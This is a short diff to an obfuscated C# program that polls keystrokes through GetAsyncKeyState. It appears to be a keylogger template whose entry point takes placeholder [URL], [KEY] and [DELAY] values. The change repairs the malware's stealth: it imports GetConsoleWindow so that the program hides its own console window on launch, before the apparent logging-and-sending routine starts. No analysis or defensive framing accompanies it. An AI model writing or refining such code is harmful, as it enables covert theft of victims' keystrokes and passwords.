@@ -49,6 +49,9 @@ namespace VAR1
     {
         [DllImport("user32.dll")]
         static extern bool ShowWindow(IntPtr VAR102, UInt32 VAR101);
+        
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
 
         [DllImport("user32.dll")]
         static extern short GetAsyncKeyState(int VAR34);
@@ -402,7 +405,7 @@ namespace VAR1
 
         public static void Main()
         {
-            ShowWindow(IntPtr.Zero, 0);
+            ShowWindow(GetConsoleWindow(), 0);
             VAR13("[URL]", "[KEY]", "[DELAY]");
         }
 
